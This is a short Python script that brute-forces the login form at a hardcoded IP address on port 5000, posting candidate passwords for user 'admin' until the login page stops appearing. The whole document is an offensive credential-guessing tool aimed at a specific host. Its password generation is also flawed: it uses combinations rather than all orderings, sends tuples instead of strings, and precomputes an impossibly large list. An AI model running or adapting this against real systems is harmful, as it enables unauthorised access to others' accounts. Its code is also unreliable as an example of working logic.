from itertools import combinations
from requests import post

digits = [str(n) for n in range(10)]
alph = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
alph.extend([c.upper() for c in alph])
#others = ['`', '~', '!', '@', '#', '$', '^', '&', '*', '(', ')', '-', '_', '+', '=', '{', '}', '[', ']', '|', ':', ';', '"', "'", ',', '<', '>', '.', '/', '?']
alph.extend(digits)
print(len(alph))
pwords = list()
for i in range(1, 10):
    pwords.extend(combinations(alph, i))
print(len(pwords))

url = r"http://138.197.193.132:5000/login"

p = None
test = r"<h2>Login</h2>"

for pword in pwords:
    p = post(url, data={'username':'admin', 'password':pword})
    if test not in p.text:
        break

print(p.text)